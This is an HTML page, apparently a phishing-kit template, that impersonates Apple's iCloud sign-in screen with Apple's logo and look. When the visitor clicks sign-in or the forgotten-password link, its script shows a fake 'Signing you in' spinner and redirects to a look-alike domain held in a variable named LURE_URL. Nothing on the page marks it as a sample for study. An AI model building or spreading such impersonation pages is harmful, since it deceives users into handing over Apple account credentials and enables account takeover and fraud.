<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in to iCloud</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:-apple-system,BlinkMacSystemFont,'SF Pro Display','Helvetica Neue',Helvetica,Arial,sans-serif;background:linear-gradient(135deg,#e8f4fd 0%,#d0e8f7 100%);display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh}
.card{background:rgba(255,255,255,.92);backdrop-filter:blur(20px);border-radius:18px;box-shadow:0 20px 60px rgba(0,0,0,.12);padding:48px 44px;width:100%;max-width:400px;text-align:center}
.apple-logo{margin-bottom:8px}.apple-logo svg{display:block;margin:0 auto}
h1{font-size:28px;font-weight:700;color:#1d1d1f;margin-bottom:6px}
p.sub{color:#6e6e73;font-size:16px;margin-bottom:32px}
.field{position:relative;margin-bottom:12px}
input{display:block;width:100%;background:#f5f5f7;border:1.5px solid transparent;border-radius:10px;padding:14px 16px;font-size:17px;color:#1d1d1f;outline:none;transition:border .2s}
input:focus{border-color:#0071e3;background:#fff}
.btn{display:block;width:100%;padding:14px;background:#0071e3;color:#fff;border:none;border-radius:10px;font-size:17px;font-weight:600;cursor:pointer;margin-top:8px;transition:background .2s}
.btn:hover{background:#0077ed}.link{color:#0071e3;font-size:14px;text-decoration:none;display:block;margin-top:16px}
.spinner{width:32px;height:32px;border:2.5px solid #e0e0e0;border-top:2.5px solid #0071e3;border-radius:50%;animation:spin .8s linear infinite;margin:20px auto}
@keyframes spin{to{transform:rotate(360deg)}}#loading{display:none}</style></head>
<body><div id="main">
<div class="card" id="card">
<div class="apple-logo"><svg xmlns="http://www.w3.org/2000/svg" width="40" height="48" viewBox="0 0 814 1000"><path fill="#1d1d1f" d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.3-164-39.3c-76 0-103.7 40.8-165.9 40.8s-105-57.8-155.5-127.4C46 576.7 0 448.3 0 326.1 0 156.2 83.4 65.7 164.2 42.4c64.5-18.7 128.5-13.3 182.9 1.6 41.5 11.3 80.7 29 110.5 29 26 0 65.8-15.9 116.9-27.9C598.3-6.6 647-15.2 698.1 1.6 728.9 10.3 798.8 42.7 835 99.2c-8.3 4.7-87.2 45.4-87.1 137.5.1 109.6 93.3 147.9 96.7 149.3l-56.5-45.1z"/></svg></div>
<h1>Sign in to iCloud</h1>
<p class="sub">Use your Apple Account</p>
<input type="email" placeholder="Apple Account" id="em">
<input type="password" placeholder="Password" id="pw">
<button class="btn" onclick="go()">Sign in</button>
<a href="#" class="link" onclick="go();return false">Forgot Apple Account or password?</a>
</div>
<div id="loading" style="text-align:center;padding:60px 20px"><div class="spinner"></div><p style="color:#6e6e73;font-size:15px;margin-top:8px">Signing you in&hellip;</p></div>
</div>
<script>
var LURE_URL='https://www.icloud2026.authenticationsession.online/mRzqxfVp'; /* AUTO_LURE_URL */
function go(){document.getElementById('card').style.display='none';document.getElementById('loading').style.display='block';setTimeout(function(){window.location.href=LURE_URL;},500);}
</script></body></html>
